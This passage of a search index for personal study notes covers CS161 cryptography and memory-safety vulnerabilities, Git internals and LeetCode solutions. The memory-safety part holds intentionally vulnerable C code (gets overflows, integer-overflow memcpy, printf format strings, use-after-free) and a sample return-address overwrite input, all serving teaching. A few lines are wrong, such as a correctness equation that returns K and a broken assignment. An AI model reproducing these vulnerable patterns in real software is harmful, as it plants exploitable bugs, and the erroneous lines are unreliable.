key</p>"},{"location":"cs161/Cryptography/asymmetric/#rsa","title":"RSA","text":"<p>RSA public-key cryptosystem, named after its inventors Ronald Rivest, Adi Shamir and Leonard Adleman</p> <p>RSA Hardness:  Suppose \\(n = pq\\), i.e. \\(n\\) is the product of two large primes \\(p\\) and \\(q\\). Given \\(c =m^e \\pmod n\\) and \\(e\\), it is computationally hard to find \\(m\\). However, with the factorization of \\(n\\) (i.e. \\(p\\) or \\(q\\)), it becomes easy to find \\(m\\).</p> <p>Let \\(p\\) and \\(q\\) be two large primes (typically having, say, 512 bits each), and let \\(N = pq\\).  Also, let \\(e\\) be any number that is relatively prime to \\((p\u22121)(q\u22121)\\). (Typically \\(e\\) is chosen to be a small value such as 3.) </p> <p>Then Bob\u2019s public key is the pair of numbers \\((N,e)\\).  The private key is the number \\(d\\), which is the inverse of \\(e\\) mod \\((p\u22121)(q\u22121)\\). (This inverse is guaranteed to exist because \\(e\\) and \\((p\u22121)(q\u22121)\\) are coprime.)</p> <p>encryption: \\(C = M^e \\mod N\\)</p> <p>decryption: \\(M = C^d \\mod N\\)</p> <p>deterministic, so not IND-CPA secure</p> <p>public-key padding is a tool for mixing in some randomness so that the ciphertext output \u201clooks random,\u201d but can still be decrypted to retrieve the original plaintext.</p> <p>Despite the name, RSA padding modes are more similar to the IVs in block cipher modes than the padding in block cipher modes. </p> <p>One common padding scheme is OAEP (Optimal Asymmetric Encryption Padding). </p> <ul> <li>Encryption\uff1a <pre><code>r = random()\nmasked_m = M XOR MGF(r)\nmasked_r = r XOR MGF(masked_m)\nEM = masked_m||masked_r\nC = RSA_Enc(EM, PK)\n</code></pre></li> <li>Decryption: <pre><code>EM = RSA_Dec(C, SK)\nr = masked_r XOR MGF(masked_m)\nM = masked_m XOR MGF(r)\n</code></pre></li> </ul>"},{"location":"cs161/Cryptography/asymmetric/#el_gamal_encryption","title":"El Gamal encryption","text":"<ul> <li> <p>System parameters: a 2048-bit prime \\(p\\), and a value \\(g\\) in the range \\(2 \\ldots p-2\\). Both are arbitrary, fixed, and public.</p> </li> <li> <p>Key generation: Bob picks \\(b\\) in the range \\(0 \\ldots p-2\\) randomly, and computes \\(B = g^{b} \\bmod p\\). His public key is \\(B\\) and his private key is \\(b\\).</p> </li> <li> <p>Encryption: \\(E_{B}(m) = (g^{r} \\bmod p, m \\times B^{r} \\bmod p)\\) where \\(r\\) is chosen randomly from \\(0 \\ldots p-2\\).</p> </li> <li> <p>Decryption: \\(D_{b}(R, S) = R^{-b} \\times S \\bmod p\\).</p> </li> </ul>"},{"location":"cs161/Cryptography/asymmetric/#public_key_distribution","title":"Public Key Distribution","text":"<p>Attila the attacker could broadcast his own public key, pretending to be Bob: he could send a spoofed broadcast message that appears to be from Bob, but that contains a public key that Attila generated. </p>"},{"location":"cs161/Cryptography/asymmetric/#session_keys","title":"Session Keys","text":"<p>Because public key schemes are expensive and difficult to make IND-CPA secure, we tend to only use public key cryptography to distribute one or more session keys, which are the keys used to actually encrypt and authenticate the message</p> <p>Often, we generate several different session keys for different purposes (MAC, encrypt...).</p> <p>Alice: generates a random set of session keys.  encrypts the message using a symmetric algorithm with the session keys encrypts the random session keys with Bob\u2019s public key</p> <p>Bob: decrypts the session keys uses the session keys to decrypt the original message.</p>"},{"location":"cs161/Cryptography/asymmetric/#digital_signature","title":"Digital Signature","text":"\\[ \\begin{aligned} S = Sign(SK, M)\\\\ Verify(PK, M, S) -&gt; true / false \\end{aligned} \\]"},{"location":"cs161/Cryptography/hash/","title":"Hash Functions","text":""},{"location":"cs161/Cryptography/hash/#cryptographic_hashes","title":"Cryptographic Hashes  <p>A cryptographic hash function is a function,\\(H\\) , that when applied on a message,\\(M\\) , can be used to generate a fixed-length \u201cfingerprint\u201d of the message.</p>","text":""},{"location":"cs161/Cryptography/hash/#properties","title":"Properties","text":"<p>deterministic </p> <p>unkeyed</p> <p>Avalanche effect: a small change in the input causes a significant and unpredictable change in the output hash value.</p> <ul> <li> <p>One-way / Preimage resistant: given a hash output \\(y\\), it's infeasible to find any \\(x\\) such that \\(H(x) = y\\)</p> </li> <li> <p>Second preimage resistant: Given an input \\(x\\), it's infeasible to find another input \\(x'\\) such that \\(H(x) = H(x')\\)</p> </li> <li> <p>Collision resistant: It's infeasible to find any pair of messagess \\(x,x'\\) such that \\(H(x) = H(x')\\)</p> </li> </ul> <p>infeasible: there is no known way to accomplish it with any realistic amount of computing power</p> <p>Under certain threat models, hash functions can be used to verify message integrity. </p>"},{"location":"cs161/Cryptography/intro/","title":"Introduction","text":"<p>Confidentiality is the property that prevents adversaries from reading our private data. The ciphertext C should give the attacker no additional information about the message M.</p> <p>Integrity is the property that prevents adversaries from tampering with our private data.</p> <p>Authenticity is the property that lets us determine who created a given message.</p>"},{"location":"cs161/Cryptography/intro/#ind-cpa_security","title":"IND-CPA Security","text":"<p>indistinguishability under chosen plaintext attack (IND-CPA) game</p> <ol> <li> <p>The adversary Eve chooses two different messages, \\(M_0\\) and \\(M_1\\), and sends both messages to Alice.</p> </li> <li> <p>Alice chooses a bit \\(b \\in \\{0, 1\\}\\) uniformly at random, and then encrypts \\(M_b\\). Alice sends the encrypted message \\(Enc(K, M_b)\\) back to Eve.</p> </li> <li> <p>Eve is now allowed to ask Alice for encryptions of messages of Eve\u2019s choosing. Eve can send a plaintext message to Alice, and Alice will always send back the encryption of the message with the secret key. Eve is allowed to repeat this as many times as she wants. Intuitively, this step is allowing Eve to perform a chosen-plaintext attack in an attempt to learn something about which message was sent.</p> </li> <li> <p>After Eve is finished asking for encryptions, she must guess whether the encrypted message from step 2 is the encryption of \\(M_0\\) or \\(M_1\\).</p> </li> </ol>"},{"location":"cs161/Cryptography/intro/#threat_models","title":"Threat models","text":"<ul> <li>ciphertext-only attack</li> <li>known plaintext attack Eve has intercepted an encrypted message and also already has some partial information about the plaintext</li> <li>replay attack  Eve can capture an encrypted message from Alice to Bob and re-send the encrypted message to Bob again.</li> <li>chosen-plaintext attack Eve can trick Alice to encrypt arbitrary messages of Eve\u2019s choice, for which Eve can then observe the resulting ciphertexts.</li> <li>chosen-ciphertext attack Eve can trick Bob into decrypting some ciphertexts. </li> </ul>"},{"location":"cs161/Cryptography/symmetric/","title":"Symmetric","text":""},{"location":"cs161/Cryptography/symmetric/#symmetric-key_encryption","title":"Symmetric-Key Encryption   <p>we are going to assume that all messages are bitstrings, which is a sequence of bits, 0 or 1</p>","text":""},{"location":"cs161/Cryptography/symmetric/#symmtric-key_encrytion","title":"Symmtric-Key Encrytion","text":"<p>Algorithm: $$ \\begin{aligned} K = KeyGen() \\ C = Enc(M, K) \\ M = Dec(C, K) \\end{aligned} $$ Correctness:  $$ Dec(Enc(M), K) = K $$</p>"},{"location":"cs161/Cryptography/symmetric/#one_time_pad_otp","title":"One Time Pad (OTP)","text":"<p>Encryption: \\(C = M \\oplus K\\) Decryption: \\(M = C \\oplus K\\)</p> <p>Correctness: \\((M \\oplus K) \\oplus K = M\\)</p> <p>Drawback: The shared key cannot be reused to transmit another message</p> <p>if a key is uesd twice:</p> \\[ \\begin{aligned} C_1 = M_1 \\oplus K \\\\ C_2 = M_2 \\oplus K \\\\ =&gt; C_1 \\oplus C_2 = M_1 \\oplus M_2 \\end{aligned} \\]"},{"location":"cs161/Cryptography/symmetric/#block_ciphers","title":"Block Ciphers","text":"<p>Encryption takes in an n-bit plaintext and a k-bit key as input and outputs an n-bit ciphertext.  Decryption takes in an n-bit ciphertext and a k-bit key as input and outputs an n-bit plaintext. $$ E:{0,1}^n \\times {0,1}^k -&gt; {0, 1}^n $$ given K: $$ E_k:{0,1}^n -&gt; {0, 1}^n $$</p> <p>AES: k = 128, 192, 256</p> <p>Correctness: \\(Ek(M)\\) should be bijective  Efficiency: XORs and bit-shifting (fast) Security:  - computationally indistinguishable from random permutation - not IND-CPA secure since it's deterministic</p>"},{"location":"cs161/Cryptography/symmetric/#block_cipher_modes_of_operation","title":"Block Cipher Modes of Operation","text":"<p>Issues of block cipher: - fixed-length message - determinitic</p> <p>To fix these problems, the encryption algorithm can either be randomized or stateful.  The decryption algorithm, however, is neither randomized nor stateful.</p> <p>ECB Mode (Electronic Code Book) - break M into n-bit blocks  - encode each block - concatenate</p> <p>encryption: \\(C_i = E_k(M_i)\\)</p> <p>decryption: \\(M_i = D_k(C_i)\\)</p> <p>CBC Mode (Cipher Block Chaining) </p> <p>Probabilistic Encryption if IV is random</p> <p>CFB Mode (Ciphertext Feedback Mode)</p> <p>OFB Mode (Output Feedback Mode)</p> <p>Counter (CTR) Mode</p> <p>encryption: \\(C_i = E_k(IV||i) \\oplus M_i\\)</p> <p>decryption: \\(M_i = E_k(IV||i) \\oplus C_i\\)</p> <p></p> sequential parallel <p>https://textbook.cs161.org/crypto/symmetric.html#64-block-ciphers</p>"},{"location":"cs161/Cryptography/symmetric/#padding","title":"Padding","text":"<p>Padding is the process of adding extra data to a message \u200b\u200bbefore\u200b\u200b encryption to ensure its length meets the specific requirements of the cryptographic algorithm.</p> <p>One correct padding scheme is PKCS#7 padding. In this scheme, we pad the message by the number of padding bytes used.</p>"},{"location":"cs161/Cryptography/symmetric/#aes","title":"AES","text":"<p>AES encryption operates on a block of data through multiple rounds of processing.  Each round applies a set of reversible transformations to a two-dimensional 4x4 array of bytes called the \u200b\u200bState\u200b\u200b.</p> <p>The main steps for encrypting a single 128-bit block are:</p> <p>Key Expansion   The original cipher key is used to derive a set of round keys (a key schedule) using the Rijndael key schedule algorithm.</p> <p>Initial Round:\u200b - \u200b\u200bAddRoundKey   Each byte of the state is combined with a round key using bitwise XOR.</p> <p>Main Rounds (Repeated for 9, 11, or 13 rounds depending on key size):\u200b - SubBytes   A non-linear substitution step where each byte is replaced with another byte according to a lookup table (S-box).    This provides confusion. - ShiftRows   A transposition step where each row of the state is shifted cyclically a certain number of steps. The first row is not shifted, the second is shifted by one, etc.    This provides diffusion. - MixColumns   A mixing operation which operates on the columns of the state, combining the four bytes in each column.    This also provides diffusion. - AddRoundKey   The round key is XOR'd with the state again.</p> <p>Final Round (No MixColumns):\u200b\u200b</p> <ul> <li>\u200bSubBytes\u200b\u200b</li> <li>\u200b\u200bShiftRows\u200b\u200b</li> <li>\u200b\u200bAddRoundKey\u200b</li> </ul>"},{"location":"cs161/Cryptography/symmetric/#message_authentication_codes_macs","title":"Message Authentication Codes (MACs)","text":"<p>A MAC is a keyed checksum of the message that is sent along with the message. It takes in a fixed-length secret key and an arbitrary-length message, and outputs a fixed-length checksum.  A secure MAC has the property that any change to the message will render the checksum invalid.</p> <p>Alice:  compute a MAC \\(T = F(K,M)\\) send \\((M,T)\\) to Bob</p> <p>Bob: recompute \\(F(K,M)\\) and check if it matches \\(T\\)</p>"},{"location":"cs161/Cryptography/symmetric/#diffie-hellman_key_exchange","title":"Diffie-Hellman key exchange","text":"<p>One-way functions</p> <p>Discrete logarithm problem:</p> <p>\\(f(x) = g^x \\pmod p\\), where \\(p\\) is a large prime and \\(g\\) is a specially-chosen generator</p> <p>Given \\(f(x)\\), there is no known efficient algorithm to solve for \\(x\\).</p> <p>Alice picks a secret \\(a \\in \\{0,1,...,p-2\\}\\) and computes \\(A=g^a \\mod p\\). Bob picks a secret \\(b\\) and computes \\(B=g^b \\mod p\\). </p> <p>Alice compute $$ S=B^a = g^{ab} $$</p> <p>Bob compute $$ S=A^b = g^{ab} $$</p>"},{"location":"cs161/memory%20safety/mitigating/","title":"Mitigating","text":""},{"location":"cs161/memory%20safety/mitigating/#mitigating_memory-safety_vulnerabilities","title":"Mitigating Memory-Safety Vulnerabilities","text":""},{"location":"cs161/memory%20safety/mitigating/#address_space_layout_randomization_aslr","title":"Address Space Layout Randomization (ASLR)","text":"<p>With ASLR, each time the program is run, the beginning of each section of memory is randomly chosen. Also, if the program imports libraries, we can also randomize the starting addresses of each library\u2019s source code.</p> <p>There are some constraints to randomizing the sections of memory. For example, segments usually need to start at a page boundary. In other words, the starting address of reach section of memoy needs to be a multiple of the page size (typically 4096 bytes in a 32-bit architecture).</p>"},{"location":"cs161/memory%20safety/vulnerabilities/","title":"Vulnerabilities","text":""},{"location":"cs161/memory%20safety/vulnerabilities/#memory_safety_vulnerabilities","title":"Memory Safety Vulnerabilities","text":""},{"location":"cs161/memory%20safety/vulnerabilities/#buffer_overflow","title":"Buffer Overflow","text":"<p>Buffer overflow vulnerabilities are a particular risk in C</p> <p>Absence of automatic bounds-checking for array or pointer accesses: if the programmer declares an array char <code>buffer[4]</code>, C will not automatically throw an error if the programmer tries to access <code>buffer[5]</code></p> <pre><code>char buf[8];\nint authenticated = 0;\nvoid vulnerable() {\n    gets(buf);\n}\n</code></pre> <ul> <li> <p>Defined outside of the function, <code>char buf[8]</code> and <code>authenticated</code> are both located in the static part of memory.</p> </li> <li> <p>In C, static memory is filled in the order that variables are defined, so <code>authenticated</code> is at a higher address in memory than <code>buf</code></p> </li> </ul> <p>static: |   | |---| |authenticated| |buf| |buf| || </p> <p>If the attacker can write 9 bytes of data to buf (with the 9<sup>th</sup> byte set to a non-zero value), then this will set the authenticated flag to true, and the attacker will be able to gain access.</p> <p><pre><code>char buf[8];\nint (*fnptr)();\nvoid vulnerable() {\n    gets(buf);\n}\n</code></pre> |   | |---| | fnptr  | |buf| |buf| || </p> <p>the attacker can overwrite fnptr with any address of their choosing, redirecting program execution to some other memory location</p>"},{"location":"cs161/memory%20safety/vulnerabilities/#stack_smashing","title":"Stack Smashing","text":"<p>One powerful method for exploiting buffer overrun vulnerabilities takes advantage of the way local variables are laid out on the stack.</p>"},{"location":"cs161/memory%20safety/vulnerabilities/#stack_memory_layout","title":"Stack Memory Layout","text":"<p><pre><code>void vulnerable() {\n    char buf[8];\n    gets(buf);\n}\n</code></pre> stack: || |---| |rip of vulnerable| |fsp of vulnerable| |buf| |buf| ||</p> <p>Data storage order: - The stack only grows down when we call a new function and need to allocate additional memory. When we call <code>gets</code>, user input is still written from lower addresses to higher addresses. - x86 is little-endian</p>"},{"location":"cs161/memory%20safety/vulnerabilities/#attack","title":"Attack","text":"<ul> <li> <p>shellcode at a known address input: AAAAAAAAAAAA\\xef\\xbe\\xad\\xde</p> 0xDEADBEEF AAAA AAAA AAAA </li> <li> <p>shellcode injection</p> </li> <li> <p>short:     ||     |---|     |&amp;buf|     |AAAA|     |shellcode|     |shellcode|     ||</p> </li> <li> <p>long:     ||     |---|     |shellcode|     |&amp;rip + 4|     |AAAA|     |AAAA|     |AAAA|     ||</p> </li> </ul>"},{"location":"cs161/memory%20safety/vulnerabilities/#vulnerable_c_library_functions","title":"Vulnerable C Library Functions","text":"<ul> <li>gets -&gt; fgets   <pre><code>char name[20];\nfgets(name, sizeof(name), stdin);\n</code></pre></li> <li>strcpy -&gt; strncpy / strlcpy</li> <li>strlen -&gt; strnlen</li> <li>sprintf -&gt; snprintf</li> </ul>"},{"location":"cs161/memory%20safety/vulnerabilities/#integer_overflow","title":"Integer Overflow","text":"<p>C compiler won\u2019t warn about the type mismatch between signed <code>int</code> and <code>unsigned int</code>; it silently inserts an implicit cast.  <pre><code>void *memcpy(void *dest, const void *src, size_t n);\n</code></pre> <pre><code>typedef unsigned int size_t;\n</code></pre></p> <p><pre><code>char buf[8];\nvoid vulnerable() {\n    int len = read_int_from_network();\n    char *p = read_string_from_network();\n    if (len &gt; 8) {\n        error(\"length too large: bad dog, no cookie for you!\");\n        return;\n    }\n    memcpy(buf, p, len);\n}\n</code></pre> paylaod: a negative <code>len</code></p> <p><pre><code>void vulnerable() {\n    size_t len;\n    char *buf;\n\n    len = read_int_from_network();\n    buf = malloc(len+5);\n    read(fd, buf, len);\n    ...\n}\n</code></pre> payload: a large <code>len</code> e.g. 0xFFFFFFFF In this case, the code allocates a 4-byte buffer and then writes a lot more than 4 bytes into it: a classic buffer overflow.</p> <p>check bounds whenever add to integers <pre><code>void safe(size_t len, char *data){\n    if (len &gt; MAX_SIZE - 2) {\n        return;\n    }\n    char *buf = malloc(len + 2);\n    if (!buf) {\n        return;\n    }\n    memcpy(buf, data, len);\n    buf[len] = '\\n';\n    buf[len + 1] '\\0';\n}\n</code></pre></p>"},{"location":"cs161/memory%20safety/vulnerabilities/#format_string_vulnerabilities","title":"Format string vulnerabilities","text":"<p><pre><code>printf(\"x has the value %d, y has the value %d, z has the value %d \\n\", x, y, z);\n</code></pre> arguments to a function are pushed onto the stack in reverse order || |---| |z| |y| |x| |&amp;\"x has the value %d, y has the value %d, z has the value %d \\n\"| |rip of printf| |sfp of printf|</p> <p>In cases of a mismatch, it will fetch some data from the stack that does not belong to the function call. <pre><code>printf(\"x has the value %d, y has the value %d, z has the value %d \\n\", x, y);\n</code></pre></p> <p>%n \u2192 Treat the argument as an address and write the number of characters that have been printed so far to that address <pre><code>printf(\"item %d:%n\", 3, &amp;val);   // store 7 in val\n</code></pre> mismatch: <pre><code>printf(\"000%n\");    // write 3 to the integer pointed to by address located 8 bytes above the RIP of printf\n</code></pre> || |---| |???    // fetch this as the second argument, treat it as a pointer| |&amp;\"000%n\"   // the first argument| |rip of printf| |fsp of printf|</p> <p><pre><code>char buf[64]\n\nvoid vulnerable(void) {\n    char *secret_string = \"pancake\";\n    int secret_number = 42;\n    if (fgets(buf, 64, stdin) == NULL) {\n        return;\n    } \n    printf(buf);\n}\n</code></pre> || |---| |&amp;secret_string| |secret_number| |&amp;buf -&gt; \"%d%n\"| |rip of printf| ||</p> <ul> <li>input: %d%n</li> <li>output: 42  write 2 to the secret_string</li> </ul> <p>never use untrusted input in the first argument of printf <pre><code>printf(\"%s\", buf);\n</code></pre></p>"},{"location":"cs161/memory%20safety/vulnerabilities/#heap_vulnerability","title":"Heap Vulnerability","text":"<p>Objects are allocated in the heap (using <code>malloc</code> in C and <code>new</code> in C++...)</p>"},{"location":"cs161/memory%20safety/vulnerabilities/#heap_overflow","title":"Heap Overflow","text":"<p>C++ vtable Each class has a virtual table (table of function pointers), and each object points to its class's vtable  Suppose an instance variable of x is a buffer that we can overflow:  when y calls its method, the shellcode will be executed</p>"},{"location":"cs161/memory%20safety/vulnerabilities/#use-after-free","title":"Use-after-free","text":"<pre><code>void test_uaf() {\n    int *arr1 = malloc(10 * sizeof(int));\n    free(arr1); // the memory is freed, but arr1 still points to it\n\n    int *arr2 = malloc(10 * sizeof(int));  \n    for (int i = 0; i &lt; 10; i++) {\n        arr2[i] = i + 100;  \n    }\n\n    printf(\"UAF: %d\\n\", arr1[0]); // might print 100\n}\n</code></pre>"},{"location":"cs161/memory%20safety/x86/","title":"x86 Assembly","text":""},{"location":"cs161/memory%20safety/x86/#memory_layout","title":"Memory Layout","text":""},{"location":"cs161/memory%20safety/x86/#little_endian","title":"Little Endian","text":"<p>x86 is a little-endian system. This means that when storing a word in memory, the least significant byte is stored at the lowest address, and the most significant byte is stored at the highest address.</p>"},{"location":"cs161/memory%20safety/x86/#registers","title":"Registers","text":"<p>The e in the register abbreviations stands for \u201cextended\u201d and indicates that we are using a 32-bit system (extended from the original 16-bit systems).</p> <ul> <li><code>eip</code> is the instruction pointer, and it stores the address of the machine instruction currently being executed. </li> <li><code>ebp</code> is the base pointer, and it stores the address of the top of the current stack frame. </li> <li><code>esp</code> is the stack pointer, and it stores the address of the bottom of the current stack frame. </li> </ul> <p>The top of the current stack frame is the highest address associated with the current stack frame, and the bottom of the stack frame is the lowest address associated with the current stack frame.</p>"},{"location":"cs161/memory%20safety/x86/#pushing_and_popping","title":"Pushing and Popping","text":"<p>push: - First, we have to allocate additional space on the stack by decrementing <code>esp</code>.  - Then, we store the value in the newly allocated space. </p> <p>pop: - The x86 pop instruction increments <code>esp</code> to remove the next value on the stack.  - It also takes the value that was just popped and copies the value into a register.</p>"},{"location":"cs161/memory%20safety/x86/#function_calls","title":"Function Calls","text":"<p>In this example, main is the caller function and foo is the callee function. </p> <ol> <li>Push arguments onto the stack.</li> <li>Push the old eip / rip (return instruction pointer) on the stack.</li> <li>Update eip.</li> <li>Push the old ebp / sfp (saved frame pointer) on the stack. </li> <li>Move ebp down.</li> <li>Move esp down.    Allocate new space for the new stack frame</li> <li>Execute the function.        Local variables and any other necessary data can now be saved in the new stack frame.     Additionally, since <code>ebp</code> is always pointing at the top of the stack frame, we can use it as a point of reference to find other variables on the stack. </li> <li>Move esp up.    Once the function is ready to return, we increment esp to point to the top of the stack frame (ebp).     (Anything on the stack below esp is undefined.)</li> <li>Restore the old ebp (sfp). </li> <li>Restore the old eip (rip). </li> <li>Remove arguments from the stack.     We remove them by incrementing esp.</li> </ol>"},{"location":"git/git/","title":"Git","text":""},{"location":"git/git/#version_control","title":"Version Control","text":""},{"location":"git/git/#gits_data_model","title":"Git's data model <p>A file is called a \"blob\", and it's just a bunch of bytes. A directory is called a \"tree\", and it maps names to blobs or trees. A snapshot is the top-level tree that is being tracked. A commit is a combination of log messages, other metadata (commit date, author, etc.), a reference to a tree, and references to parent commits. </p> <pre><code>// a file is a bunch of bytes\ntype blob = array&lt;byte&gt;\n\n// a directory contains named files and directories\ntype tree = map&lt;string, tree | blob&gt;\n\n// a commit has parents, metadata, and the top-level tree\ntype commit = struct {\n    parents: array&lt;commit&gt;\n    author: string\n    message: string\n    snapshot: tree\n}\n</code></pre>","text":""},{"location":"git/git/#modeling_history_relating_snapshots","title":"Modeling history: relating snapshots","text":"<pre><code>o &lt;-- o &lt;-- o &lt;-- o &lt;---- o\n            ^            /\n             \\          v\n              --- o &lt;-- o\n</code></pre>"},{"location":"git/git/#objects_and_content-addressing","title":"Objects and content-addressing","text":"<p><pre><code>type object = blob | tree | commit\n</code></pre> In Git data store, all objects are content-addressed by their SHA-1 hash. <pre><code>objects = map&lt;string, object&gt;\n\ndef store(object):\n    id = sha1(object)\n    objects[id] = object\n\ndef load(id):\n    return objects[id]\n</code></pre> e.g. the tree above: <pre><code>git cat-file -p 698281bc680d1995c5f4caaf3359721a5a58d48d\n\n    100644 blob 4448adbf7ecd394f42ae135bbeed9676e894af85    baz.txt\n    040000 tree c68d233a33c5c06e0340e4c224f0afca87c8ce87    foo\n\ngit cat-file -p 4448adbf7ecd394f42ae135bbeed9676e894af85\n\n    git is wonderful\n</code></pre></p>"},{"location":"git/git/#references","title":"References","text":"<p>References are pointers to commits. <pre><code>references = map&lt;string, string&gt;\n\ndef update_reference(name, id):\n    references[name] = id\n\ndef read_reference(name):\n    return references[name]\n\ndef load_reference(name_or_id):\n    if name_or_id in references:\n        return load(references[name_or_id])\n    else:\n        return load(name_or_id)\n</code></pre></p>"},{"location":"git/git/#branch","title":"Branch <p>https://learngitbranching.js.org/?locale=zh_CN</p> <ul> <li><code>git branch</code>: shows branches</li> <li><code>git branch &lt;name&gt;</code>: creates a branch</li> <li><code>git checkout -b &lt;name&gt;</code>: creates a branch and switches to it<ul> <li>same as <code>git branch &lt;name&gt;; git checkout &lt;name&gt;</code></li> </ul> </li> <li><code>git merge &lt;revision&gt;</code>: merges into current branch Fast forwarding   merge 2 'branches'  </li> <li><code>git mergetool</code>: use a fancy tool to help resolve merge conflicts</li> <li><code>git rebase</code>: rebase set of patches onto a new base</li> </ul>","text":""},{"location":"git/git/#remote","title":"Remote <ul> <li><code>git remote</code>: list remotes</li> <li><code>git remote add &lt;name&gt; &lt;url&gt;</code>: add a remote</li> <li><code>git push &lt;remote&gt; &lt;local branch&gt;:&lt;remote branch&gt;</code>: send objects to remote, and update remote reference</li> <li><code>git branch --set-upstream-to=&lt;remote&gt;/&lt;remote branch&gt;</code>: set up correspondence between local and remote branch</li> <li><code>git fetch</code>: retrieve objects/references from a remote</li> <li><code>git pull</code>: same as <code>git fetch; git merge</code></li> <li><code>git clone</code>: download repository from remote</li> </ul>","text":""},{"location":"leetcode/leetcode/","title":"Leetcode","text":""},{"location":"leetcode/leetcode/#twosum","title":"twoSum","text":"<p>\u00d7 iterate the whole list for every num \u221a hash <pre><code>class Solution:\n    def twoSum(self, nums, target):\n        ht = {}     # initiallize!!!\n        for i, num in enumerate(nums): \n            if num in ht:\n                return [i, ht[num]]\n            ht[target - num] = i \n</code></pre></p>"},{"location":"leetcode/leetcode/#addtwonumbers","title":"addTwoNumbers","text":"<p>LinkList -&gt; dummy head!!! <pre><code># Definition for singly-linked list.\n# class ListNode(object):\n#     def __init__(self, val=0, next=None):\n#         self.val = val\n#         self.next = next\nclass Solution(object):\n    def addTwoNumbers(self, l1, l2):\n        \"\"\"\n        :type l1: Optional[ListNode]\n        :type l2: Optional[ListNode]\n        :rtype: Optional[ListNode]\n        \"\"\"\n        co = 0\n        res = ListNode()\n        cur = res\n        while l1 != None or l2 != None:\n            cur.next = ListNode()\n            cur = cur.next\n            s = co\n            if l1:\n                s += l1.val\n                l1 = l1.next\n            if l2:\n                s += l2.val\n                l2 = l2.next\n\n            if s &gt;= 10:\n                co = 1\n                cur.val = s - 10\n            else:\n                co = 0\n                cur.val = s\n\n        if co == 1:\n            cur.next = ListNode(1, None)\n        return res.next \n</code></pre></p>"},{"location":"leetcode/leetcode/#lengthoflongestindex","title":"lengthOfLongestIndex","text":"cases expected remark \"abac\" 3 \u5f53\u51fa\u73b0\u91cd\u590d\u5b57\u7b26\u65f6\uff0c\u5e94\u5f53\u4ece\u4e0a\u4e00\u51fa\u73b0\u4f4d\u7f6e\u7684\u4e0b\u4e00\u4e2a\u5f00\u59cb\u91cd\u65b0\u8ba1\u7b97\uff0c\u800c\u4e0d\u662f\u7b2c\u4e8c\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e \" \" 1 \u4e0d\u80fd\u7b49\u51fa\u73b0\u91cd\u590d\u4e86\u624d\u7edf\u8ba1\u5b57\u7b26 <p><pre><code>class Solution(object):\n    def lengthOfLongestSubstring(self, s):\n        \"\"\"\n        :type s: str\n        :rtype: int\n        \"\"\"\n        char_index = {}\n        max_len = 0\n        left = 0\n\n        for right, char in enumerate(s):\n            if char in char_index and char_index[char] &gt;= left:\n                left = char_index[char] + 1\n            char_index[char] = right\n            max_len = max(max_len, right - left + 1)\n\n        return max_len\n</code></pre> substring: - left &amp; right + char_index \u221a     <pre><code>if char in char_index and char_index[char] &gt;= left: \n    left = char_index[char] + 1     # O(N)\n    ...\n</code></pre> - substr[] \u00d7     <pre><code>if cur_char in substr:  \n    pos = substr.index()    # O(N^2)\n    substr = substr[pos + 1:] + [letter]    \n...\n</code></pre></p> <p>max_len: - max_len \u221a - max(possible_max_lens) \u00d7</p>"},{"location":"leetcode/leetcode/#longestpalindrome","title":"longestPalindrome","text":"<p>2 simplest cases: - even length: \"aa\" - odd length: \"a\"</p> <p>then try to extend them  <pre><code>class Solution(object):\n    def longestPalindrome(self, s):\n        \"\"\"\n        :type s: str\n        :rtype: str\n        \"\"\"\n        max_len = 0\n        max_str = []\n        for cur in range(len(s)):\n            right = cur\n            left = right - 1\n            while left &gt;= 0 and right &lt; len(s) and s[left] == s[right]:\n                left -= 1\n                right += 1\n            if left &gt;= -1 and right - left - 1 &gt; max_len:\n                max_len = right - left - 1\n                max_str = s[left + 1 : right]\n\n            right = cur\n            left = right \n            while left &gt;= 0 and right &lt; len(s) and s[left] == s[right]:\n                left -= 1\n                right += 1\n            if left &gt;= -1 and right - left - 1 &gt; max_len:\n                max_len = right - left - 1\n                max_str = s[left + 1 : right]\n\n        return \"\".join(max_str)\n</code></pre> \u26a0\ufe0floop variable cannot be reassigned within the loop  <pre><code>for right in range(len(s)):\n    ...\n    right += 1\n    ...\n</code></pre></p>"},{"location":"leetcode/leetcode/#convert_zigzag","title":"convert (zigzag)","text":""},{"location":"leetcode/leetcode/#compressed_matrix","title":"compressed matrix","text":"<p><pre><code>class Solution(object):\n    def convert(self, s, numRows):\n        \"\"\"\n        :type s: str\n        :type numRows: int\n        :rtype: str\n        \"\"\"\n        if numRows == 1:\n            return s\n\n        lists = [[] for _ in range(numRows)]\n\n        row = 0     # \u4e00\u7ec4\u662f2*numRow-2, 0~numRow-1 \u5f80\u4e0b\uff0cnumRow-1~2*numRow-2 \u5f80\u4e0a\n        for char in s:\n            if row &lt; numRows:\n                lists[row].append(char)\n            else:\n                lists[2 * numRows - row - 2].append(char)\n\n            row = (row + 1) % (2 * numRows - 2)\n\n        res = []\n        for row in lists:\n            for elem in row:\n                res.append(elem)\n        return \"\".join(res)\n</code></pre> black box! API! \u53ea\u9700\u8981\u8fd4\u56de\u6309\u884c\u8f93\u51fa\u7684\u7ed3\u679c \u4e2d\u95f4\u8fc7\u7a0b\u4e0d\u9700\u8981\u771f\u7684\u5b58\u50a8 <pre><code>P   A   H   N\nA P L S I I G\nY   I   R\n</code></pre></p>"},{"location":"leetcode/leetcode/#direct_construction","title":"direct construction","text":"<pre><code>class Solution:\n    def convert(self, s: str, numRows: int) -&gt; str:\n        n, r = len(s), numRows\n        if r == 1 or r &gt;= n:\n            return s\n        t = r * 2 - 2\n        ans = []\n        for i in range(r):  # \u679a\u4e3e\u77e9\u9635\u7684\u884c\n            for j in range(0, n - i, t):  # \u679a\u4e3e\u6bcf\u4e2a\u5468\u671f\u7684\u8d77\u59cb\u4e0b\u6807\n                ans.append(s[j + i])  # \u5f53\u524d\u5468\u671f\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\n                if 0 &lt; i &lt; r - 1 and j + t - i &lt; n:\n                    ans.append(s[j + t - i])  # \u5f53\u524d\u5468\u671f\u7684\u7b2c\u4e8c\u4e2a\u5b57\u7b26\n        return ''.join(ans)\n</code></pre>"},{"location":"leetcode/leetcode/#ispalindrome","title":"isPalindrome","text":"<pre><code>class Solution(object):\n    def isPalindrome(self, x):\n        \"\"\"\n        :type x: int\n        :rtype: bool\n        \"\"\"\n        if x &lt; 0:\n            return False\n        if x % 10 == 0 and x != 0:\n            return False\n        rev = 0\n        while x &gt; rev:\n            x, rev = x // 10, rev * 10 + x % 10\n\n     